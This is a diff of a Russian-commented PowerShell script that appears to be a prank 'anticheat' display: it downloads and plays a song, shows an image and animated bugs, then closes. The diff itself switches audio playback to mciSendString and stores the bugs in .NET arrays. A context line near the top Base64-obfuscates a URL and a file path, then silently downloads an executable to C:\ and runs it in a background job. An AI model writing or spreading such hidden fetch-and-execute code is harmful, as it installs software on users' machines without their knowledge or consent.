@@ -15,13 +15,15 @@ public class BufferedPanel : Panel {
 # Танчики
 Start-Job{$f=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcdGFuNGlraS5leGU='));iwr([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yZWRpcmVjdC5sZXN0YS5ydS9NVC9sYXRlc3Rfd2ViX2luc3RhbGxfcnU='))) -O $f;&$f}|Out-Null
 
-# Скачать песню и играть через WMP COM
+# Скачать песню и играть через mciSendString
 $script:songPath="$env:TEMP\song.mp3"
 iwr "https://raw.githubusercontent.com/sweetvata/anticheat/main/song.mp3" -O $script:songPath -UseBasicParsing
-$script:wmp=New-Object -ComObject WMPlayer.OCX
-$script:wmp.URL=$script:songPath
-$script:wmp.settings.autoStart=$true
-$script:wmp.controls.play()
+Add-Type -TypeDefinition @'
+using System;using System.Runtime.InteropServices;
+public class MCI{[DllImport("winmm.dll")]public static extern int mciSendString(string cmd,System.Text.StringBuilder ret,int len,IntPtr hwnd);}
+'@
+[MCI]::mciSendString("open `"$($script:songPath)`" type mpegvideo alias song",  $null,0,[IntPtr]::Zero)|Out-Null
+[MCI]::mciSendString("play song", $null,0,[IntPtr]::Zero)|Out-Null
 
 # Картинка
 $script:imgPath="$env:TEMP\bg.jpg"
@@ -42,9 +44,13 @@ $script:clr   =@(
 
 $script:a=0.0; $script:ticks=0; $script:stopped=$false; $script:result=''
 
-# Жуки — используем один hashtable с ключами-индексами
+# Жуки через .NET float[] массивы
 $rng=New-Object System.Random
-$script:BX=@{}; $script:BY=@{}; $script:BVX=@{}; $script:BVY=@{}; $script:BSZ=@{}
+$script:BX  =New-Object float[] 20
+$script:BY  =New-Object float[] 20
+$script:BVX =New-Object float[] 20
+$script:BVY =New-Object float[] 20
+$script:BSZ =New-Object int[]   20
 for($i=0;$i-lt 20;$i++){
     $script:BX[$i]  =[float]$rng.Next(50,1800)
     $script:BY[$i]  =[float]$rng.Next(50,900)
@@ -167,7 +173,7 @@ $t1.Add_Tick({
 $tClose=New-Object System.Windows.Forms.Timer;$tClose.Interval=28000
 $tClose.Add_Tick({
     $t1.Stop();$tStop.Stop();$tClose.Stop()
-    try{$script:wmp.controls.stop()}catch{}
+    try{[MCI]::mciSendString("stop song",$null,0,[IntPtr]::Zero)|Out-Null}catch{}
     $script:form.Close()
 })
 
